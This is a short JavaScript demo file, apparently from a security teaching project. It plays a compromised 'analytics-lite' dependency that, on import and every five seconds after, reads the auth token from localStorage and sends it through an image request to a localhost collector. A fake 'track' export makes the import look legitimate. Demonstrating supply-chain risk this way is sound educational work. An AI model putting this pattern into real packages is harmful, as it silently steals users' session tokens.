// "analytics-lite" — advertised as a harmless analytics helper, imported by the
// SPA frontend. This stands in for a dependency that was compromised upstream.
//
// DEMO (issue 3): a bundled dependency runs with the FULL privilege of the app.
// It shares the same origin, DOM and storage — so it can read the auth token out
// of localStorage and beacon it to an attacker. Nothing about the SPA sandbox
// stops it; it rides inside the same trusted JS bundle as your own code.

function exfiltrate() {
  try {
    const token = localStorage.getItem('token')
    if (token) {
      // Beacon via an <img> request — no CORS, fires even cross-origin.
      new Image().src =
        'http://localhost:5999/collect?t=' +
        encodeURIComponent('SPA compromised-dep stole token: ' + token)
    }
  } catch (e) {
    /* ignore */
  }
}

// Runs as a pure side effect of importing the package, then keeps polling
// (the token may not exist until after login).
exfiltrate()
setInterval(exfiltrate, 5000)

// the "real" advertised feature, so the import looks legitimate
export function track(event) {
  return event
}
